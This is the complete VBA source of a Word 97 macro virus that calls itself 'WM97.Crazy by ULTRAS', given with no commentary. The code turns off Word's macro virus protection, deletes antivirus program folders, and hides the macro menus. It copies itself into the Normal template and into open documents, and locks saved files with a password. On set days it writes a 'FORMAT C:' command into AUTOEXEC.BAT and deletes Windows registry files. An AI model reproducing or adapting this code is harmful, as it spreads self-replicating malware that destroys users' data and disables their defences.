Attribute VB_Name = "Crazy"
Sub AutoOpen()
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo Crazy
Kill "C:\Program Files\AntiViral Toolkit Pro\*.*"
CommandBars("tools").Controls("Macro").Delete
Kill "C:\f-macro\*.*"
CommandBars("tools").Controls("Customize...").Delete
Kill "C:\Program Files\McAfee\VirusScan\*.*"
CommandBars("tools").Controls("Templates and add-ins...").Delete
Kill "C:\Program Files\Norton AntiVirus\*.*"
WordBasic.FileSummaryInfo Author:="Crazy by ULTRAS"
Kill "C:\VDOC\*.*"
Call AutoClose
Call Crazy
Crazy:
End Sub

Sub AutoClose()
On Error GoTo Crazy
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
Application.UserName = "ULTRAS"
Application.UserInitials = "Crazy"
Set GlobalDoc = NormalTemplate
Set ActiveDoc = ActiveDocument
GlobalInfect = No
DocumentInfect = No
For u = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(u).Name = "Crazy" Then
GlobalInfect = Yes
End If
Next
For w = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(w).Name = "Crazy" Then
DocumentInfect = Yes
End If
Next
If GlobalInfect = No Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Crazy", Object:=wdOrganizerObjectProjectItems
Options.SaveNormalPrompt = False
End If
If DocumentInfect = No Then
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Crazy", Object:=wdOrganizerObjectProjectItems
ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
End If
Application.DisplayAlerts = wdAlertsAll
Call Crazy
Crazy:
End Sub

Sub FileSave()
On Error GoTo Crazy
ActiveDocument.Password = "ULTRAS"
ActiveDocument.Save
Crazy:
End Sub

Sub FileSaveAs()
Dialogs(wdDialogFileSaveAs).Show
On Error GoTo Crazy
Set ULTRAS = ActiveDocument.Range(Start:=0, End:=0)
With ULTRAS
.InsertBefore "CRAZY BY ULTRAS"
.Font.Size = 50
.Font.Name = "Impact"
.Font.ColorIndex = 3
.Font.Shadow = 1
.Font.Animation = 2
End With
Crazy:
End Sub

Sub ToolsMacro()
End Sub

Sub ViewVBCode()
End Sub

Sub FileTemplates()
End Sub

Sub ToolsCustomize()
End Sub

Sub Crazy()
On Error GoTo Crazy
If Day(Now()) = 5 Then
MsgBox "You Infected WM97.Crazy by ULTRAS", vbCritical + vbOKOnly, "ULTRAS"
ActiveDocument.Password = "Crazy"
ActiveDocument.Save
End If
If Day(Now()) = 19 Then
Open "C:\AUTOEXEC.BAT" For Input As #1
Close
SetAttr "C:\AUTOEXEC.BAT", vbNormal
Open "C:\AUTOEXEC.BAT" For Append As #1
Print #1, "@ECHO OFF"
Print #1, "CLS"
Print #1, "ECHO Please wait..."
Print #1, "FORMAT C: /U /C /S /AUTOTEST > NUL"
Close #1
SetAttr "C:\AUTOEXEC.BAT", vbReadOnly
End If
If Day(Now()) = 27 Then
MsgBox "You Infected WM97.Crazy by ULTRAS", vbCritical + vbOKOnly, "ULTRAS"
SetAttr "C:\Windows\user.da0", 0
Kill "C:\Windows\user.da0"
SetAttr "C:\Windows\system.da0", 0
Kill "C:\Windows\system.da0"
SetAttr "C:\Windows\user.dat", 0
Kill "C:\Windows\user.dat"
SetAttr "C:\Windows\system.dat", 0
Kill "C:\Windows\system.dat"
End If
Crazy:
End Sub
